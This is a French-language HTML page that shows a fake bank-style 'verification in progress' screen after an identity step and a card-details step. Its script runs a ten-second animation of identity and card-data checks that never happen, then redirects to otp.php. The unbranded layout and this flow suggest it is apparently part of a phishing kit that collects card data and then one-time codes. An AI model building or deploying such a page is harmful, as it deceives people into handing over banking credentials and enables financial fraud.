<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification en cours — Espace sécurisé</title>
    <link rel="icon" href="./check.png" type="image/png">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        :root {
            --primary: #1a56db;
            --primary-dark: #1e40af;
            --primary-light: #eff6ff;
            --success: #059669;
            --gray-50: #f8fafc;
            --gray-100: #f1f5f9;
            --gray-200: #e2e8f0;
            --gray-400: #94a3b8;
            --gray-500: #64748b;
            --gray-600: #475569;
            --gray-700: #334155;
            --gray-800: #1e293b;
            --radius: 12px;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: var(--gray-50);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* ── Topbar ── */
        .topbar {
            background: #fff;
            border-bottom: 1px solid var(--gray-200);
            padding: 0 24px;
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 1px 3px rgba(0,0,0,.06);
        }
        .topbar-logo { height: 36px; object-fit: contain; }
        .topbar-secure {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 12px;
            font-weight: 600;
            color: var(--success);
        }
        .topbar-secure i { font-size: 13px; }

        /* ── Steps ── */
        .steps-bar {
            background: #fff;
            border-bottom: 1px solid var(--gray-200);
            padding: 12px 24px;
        }
        .steps {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0;
            max-width: 520px;
            margin: 0 auto;
        }
        .step {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            flex: 1;
            position: relative;
            font-size: 11px;
            font-weight: 500;
            color: var(--gray-400);
        }
        .step::after {
            content: '';
            position: absolute;
            top: 14px;
            left: 60%;
            width: 80%;
            height: 2px;
            background: var(--gray-200);
        }
        .step:last-child::after { display: none; }
        .step-circle {
            width: 28px;
            height: 28px;
            border-radius: 50%;
            border: 2px solid var(--gray-200);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: 700;
            background: #fff;
            color: var(--gray-400);
            z-index: 1;
        }
        .step.done .step-circle  { background: var(--primary); border-color: var(--primary); color: #fff; }
        .step.done::after        { background: var(--primary); }
        .step.active .step-circle{ background: var(--primary); border-color: var(--primary); color: #fff; }
        .step.active             { color: var(--primary); font-weight: 600; }

        /* ── Main ── */
        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 16px;
        }

        .card {
            background: #fff;
            border-radius: var(--radius);
            box-shadow: 0 4px 24px rgba(0,0,0,.08), 0 1px 4px rgba(0,0,0,.04);
            width: 100%;
            max-width: 480px;
            overflow: hidden;
        }

        .card-header {
            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
            padding: 28px 32px;
            text-align: center;
            color: #fff;
        }
        .card-header-icon {
            width: 56px;
            height: 56px;
            background: rgba(255,255,255,.15);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 14px;
            font-size: 24px;
        }
        .card-header h1 { font-size: 18px; font-weight: 700; margin-bottom: 4px; }
        .card-header p  { font-size: 13px; opacity: .85; }

        .card-body { padding: 36px 32px; }

        /* ── Spinner ── */
        .spinner-wrap {
            display: flex;
            justify-content: center;
            margin-bottom: 28px;
        }
        .ring-spinner {
            position: relative;
            width: 80px;
            height: 80px;
        }
        .ring-spinner svg {
            width: 80px;
            height: 80px;
            transform: rotate(-90deg);
        }
        .ring-bg    { fill: none; stroke: var(--gray-200); stroke-width: 6; }
        .ring-track {
            fill: none;
            stroke: var(--primary);
            stroke-width: 6;
            stroke-linecap: round;
            stroke-dasharray: 220;
            stroke-dashoffset: 220;
            transition: stroke-dashoffset 1s linear;
        }
        .ring-center {
            position: absolute;
            inset: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            font-weight: 700;
            color: var(--primary);
        }

        /* ── Status steps ── */
        .status-list {
            list-style: none;
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 28px;
        }
        .status-item {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 13px;
            font-weight: 500;
            color: var(--gray-500);
            transition: color .3s;
        }
        .status-item.active { color: var(--gray-800); }
        .status-item.done   { color: var(--success); }
        .status-dot {
            width: 22px;
            height: 22px;
            border-radius: 50%;
            border: 2px solid var(--gray-200);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 11px;
            flex-shrink: 0;
            transition: all .3s;
        }
        .status-item.active .status-dot {
            border-color: var(--primary);
            background: var(--primary-light);
            color: var(--primary);
        }
        .status-item.done .status-dot {
            border-color: var(--success);
            background: #d1fae5;
            color: var(--success);
        }

        /* ── Progress bar ── */
        .progress-wrap {
            background: var(--gray-100);
            border-radius: 99px;
            height: 6px;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            border-radius: 99px;
            background: linear-gradient(90deg, var(--primary), #60a5fa);
            width: 0%;
            transition: width 1s linear;
        }
        .progress-label {
            display: flex;
            justify-content: space-between;
            font-size: 11px;
            color: var(--gray-500);
            margin-top: 6px;
        }

        /* ── Footer ── */
        footer {
            text-align: center;
            padding: 20px 16px;
        }
        footer img { height: 28px; opacity: .65; }
    </style>
</head>
<body>

    <!-- Topbar -->
    <div class="topbar">
        <img src="./kwKYGMMnx5T0LeAGdXfi61a9Lkk.avif" alt="Logo" class="topbar-logo">
        <span class="topbar-secure">
            <i class="fa-solid fa-lock"></i> Connexion sécurisée
        </span>
    </div>

    <!-- Steps -->
    <div class="steps-bar">
        <nav class="steps">
            <div class="step done">
                <div class="step-circle"><i class="fa-solid fa-check" style="font-size:11px"></i></div>
                <span>Identité</span>
            </div>
            <div class="step active">
                <div class="step-circle">2</div>
                <span>Carte bancaire</span>
            </div>
            <div class="step">
                <div class="step-circle">3</div>
                <span>Confirmation</span>
            </div>
        </nav>
    </div>

    <main>
        <div class="card">
            <div class="card-header">
                <div class="card-header-icon">
                    <i class="fa-solid fa-shield-halved"></i>
                </div>
                <h1>Vérification en cours</h1>
                <p>Analyse sécurisée de vos informations</p>
            </div>

            <div class="card-body">

                <!-- Ring countdown -->
                <div class="spinner-wrap">
                    <div class="ring-spinner">
                        <svg viewBox="0 0 80 80">
                            <circle class="ring-bg"    cx="40" cy="40" r="35"/>
                            <circle class="ring-track" cx="40" cy="40" r="35" id="ringTrack"/>
                        </svg>
                        <div class="ring-center" id="countdown">10</div>
                    </div>
                </div>

                <!-- Status messages -->
                <ul class="status-list" id="statusList">
                    <li class="status-item active" id="s1">
                        <span class="status-dot"><i class="fa-solid fa-circle-notch fa-spin" style="font-size:9px"></i></span>
                        <span>Vérification de l'identité…</span>
                    </li>
                    <li class="status-item" id="s2">
                        <span class="status-dot">2</span>
                        <span>Contrôle des données bancaires…</span>
                    </li>
                    <li class="status-item" id="s3">
                        <span class="status-dot">3</span>
                        <span>Génération du code de sécurité…</span>
                    </li>
                    <li class="status-item" id="s4">
                        <span class="status-dot">4</span>
                        <span>Ouverture de l'espace sécurisé…</span>
                    </li>
                </ul>

                <!-- Progress bar -->
                <div class="progress-wrap">
                    <div class="progress-bar" id="progressBar"></div>
                </div>
                <div class="progress-label">
                    <span>Progression</span>
                    <span id="progressPct">0%</span>
                </div>

            </div>
        </div>
    </main>

    <footer>
        <img src="./T6EWjPeJbYpmdVRDMjkT58dKk.avif" alt="Sécurité">
    </footer>

    <script>
    (function () {
        const TOTAL     = 10; // secondes
        const circumf   = 2 * Math.PI * 35; // ≈ 219.9
        const ring      = document.getElementById('ringTrack');
        const countdown = document.getElementById('countdown');
        const bar       = document.getElementById('progressBar');
        const pct       = document.getElementById('progressPct');

        // Steps timing (secondes écoulées pour marquer "done" / "active")
        const steps = [
            { el: document.getElementById('s1'), doneAt: 2.5,  nextAt: 2.5  },
            { el: document.getElementById('s2'), doneAt: 5,    nextAt: 2.5  },
            { el: document.getElementById('s3'), doneAt: 7.5,  nextAt: 5    },
            { el: document.getElementById('s4'), doneAt: 10,   nextAt: 7.5  },
        ];

        ring.style.strokeDasharray  = circumf;
        ring.style.strokeDashoffset = circumf;

        let elapsed = 0;
        const TICK  = 100; // ms

        const timer = setInterval(() => {
            elapsed += TICK / 1000;
            const ratio   = Math.min(elapsed / TOTAL, 1);
            const remaining = Math.max(Math.ceil(TOTAL - elapsed), 0);

            // Ring
            ring.style.strokeDashoffset = circumf * (1 - ratio);
            countdown.textContent = remaining;

            // Progress bar
            const pctVal = Math.round(ratio * 100);
            bar.style.width   = pctVal + '%';
            pct.textContent   = pctVal + '%';

            // Status steps
            steps.forEach((s, i) => {
                if (elapsed >= s.doneAt) {
                    s.el.classList.remove('active');
                    s.el.classList.add('done');
                    s.el.querySelector('.status-dot').innerHTML = '<i class="fa-solid fa-check" style="font-size:9px"></i>';
                } else if (i === 0 || elapsed >= steps[i - 1].doneAt) {
                    if (!s.el.classList.contains('done')) {
                        s.el.classList.add('active');
                        if (!s.el.querySelector('.fa-spin')) {
                            s.el.querySelector('.status-dot').innerHTML = '<i class="fa-solid fa-circle-notch fa-spin" style="font-size:9px"></i>';
                        }
                    }
                }
            });

            // Redirect
            if (elapsed >= TOTAL) {
                clearInterval(timer);
                window.location.href = 'otp.php';
            }
        }, TICK);
    })();
    </script>

</body>
</html>
